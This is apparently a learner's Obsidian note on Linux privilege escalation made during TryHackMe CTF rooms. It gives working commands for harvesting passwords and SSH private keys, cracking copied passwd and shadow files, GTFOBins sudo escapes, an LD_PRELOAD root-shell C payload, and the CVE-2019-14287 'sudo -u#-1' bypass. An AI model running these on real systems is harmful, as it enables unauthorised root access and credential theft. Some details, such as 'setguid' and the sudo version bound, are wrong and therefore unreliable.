#### Pass & File Perm:

`history`
`cat ~/.bash_history`
[Payload-all-the-things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 * understanding the file system and elevate acc to that
 
 #find `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`

if apache web server was running, it would contains sensitive info's within it.

##### Weak file permissions:
Read access only for passwd file

![[Pasted image 20230808062354.png]]

	copy the passwd and shadow file in victim machine.
	use the tool `unshadow passwd shadow`
	it will merge  the contents with passwd file, then you are good to crack it.
	Hashcracking in hashcat.


#### Escalation via SSH Keys:
* `find / -name authorized_keys 2> /dev/null` #find 
* `find / -name id_rsa 2> /dev/null`
id_rsa is private

###### Creation of SSH keys:
Generating a Key Pairs:
`ssh-keygen -b 4096`
you can also add the generated ssh public key in root directory, if you knows the root password.

`ssh-copy-id root@ip`
	ssh key copied from generated machine to root machine.
After using copy id command the id_rsa.pub file has been renamed as `authorized keys` in the root machine.

###### Escalating the privileges:
copy the id_rsa in victim machine.

`chmod 600 id_rsa ` - change the file permission.

Connect to the root account.
```shell
ssh -i id_rsa root@machine_IP
```
	id_rsa is a private key of machine


### SUDO:
##### Shell Escape Sequence:
An bin uses with nopasswd and if it was root, we can try to access the root using GTFO bins.

![[Pasted image 20230808070610.png]]

GTFO Bins:
![[Pasted image 20230808070901.png]]
#### Escalating via LD_PRELOAD:
How to find it?
	after running the command sudo -l you can see the env variable set as LD_preload
	![[Pasted image 20230808093203.png]]
[[LD_PRELOAD]]: #Pending 
	Dynamic linker, available in most unix. preloading the shared lib for any other library was loaded.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setguid(0);
	setuid(0);
	system("/bin/bash");
}
```

```shell
	gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
	PIC - position independent code 

```shell 
sudo LD_PRELOAD=/home/user/shell.so apache2
```

#challenge **Simple CTF in tryhackme**

```shell
python3 dirsearch.py -u http://IP -e php,html -x 400,401,403
```

vim root escalation work.
`sudo vim`
#### CVE 2019 - 14287

[ExploitDB](https://www.exploit-db.com/exploits/47502)
exploit works with - sudo version <1.2.28 #MustTry

#challenge  Sudo Security Bypass in TryHackMe

**Exploit:**
```shell
sudo -u#-1 /bin/bash
```

![[Pasted image 20230808094621.png]]

#challenge Sudo Buffer Overflow in tryhackme


#### CVE 2019 - 18634
[CVEDetails](https://github.com/saleemrashid/sudo-cve-2019-18634)

basically the attacks works on sudo version < 1.8.x and pwfeedback enabled. it will exploit the bufferoverflow in victim machine and gain access to the root user.
`cat /etc/sudoers`

if any asterix is coming while typing the password means `pwfeedback` has been mentioned in the /etc/sudoers file.